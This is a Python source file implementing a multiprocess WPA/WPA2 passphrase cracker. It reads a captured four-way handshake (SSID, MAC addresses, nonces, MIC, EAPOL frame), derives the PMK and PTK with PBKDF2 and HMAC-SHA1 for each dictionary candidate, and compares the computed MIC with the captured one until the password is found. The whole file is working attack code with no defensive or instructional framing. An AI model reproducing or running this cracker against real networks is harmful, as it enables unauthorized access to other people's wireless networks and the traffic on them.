import hmac,hashlib,binascii
from hashlib import sha1
from binascii import a2b_hex, b2a_hex, unhexlify
from pbkdf2_ctypes import pbkdf2_bin
from datetime import datetime
from multiprocessing import Pool, Queue, cpu_count
from time import sleep

numOfPs = cpu_count()

def hmac4times(ptk, pke):
    tempPke = pke
    r = ''
    for i in range(4):
        r += hmac.new(ptk, pke + chr(i), sha1).digest()
    return r        


def crackProcess(ssid, clientMac, APMac, Anonce, Snonce, mic, data, passQueue, foundPassQ):
    pke = "Pairwise key expansion" + '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
    count = 0
    timeA = datetime.now()
    while True:
        passPhrase = passQueue.get()
        pmk = pbkdf2_bin(passPhrase, ssid, 4096, 32)
        ptk = hmac4times(pmk,pke)
        if ord(data[6]) & 0b00000010 == 2:
            calculatedMic = hmac.new(ptk[0:16],data,sha1).digest()[0:16]
        else:
            calculatedMic = hmac.new(ptk[0:16],data).digest()
        if mic == calculatedMic:
            foundPassQ.put(passPhrase)

def crack(ssid, clientMac, APMac, Anonce, Snonce, mic, data, passQueue):
    foundPassQ = Queue()
    try:
        timeA = datetime.now()
        startSize = passQueue.qsize()
    except:
        pass
    pool = Pool(numOfPs, crackProcess, (ssid, clientMac, APMac, Anonce, Snonce, mic, data, passQueue, foundPassQ))
    while True:
        sleep(1)
        try:
            timeB = datetime.now()
            currentSize = passQueue.qsize()
            print str(100 - 100.0 * currentSize / startSize) + "% done. " + str((startSize - currentSize) / (timeB - timeA).total_seconds()) + " hashes per second"
        except:
            pass
        if foundPassQ.empty():
            if passQueue.empty():
                returnVal = False
                break
        else:
            passphrase = foundPassQ.get()
            returnVal = passphrase
            break
    pool.terminate()
    return returnVal

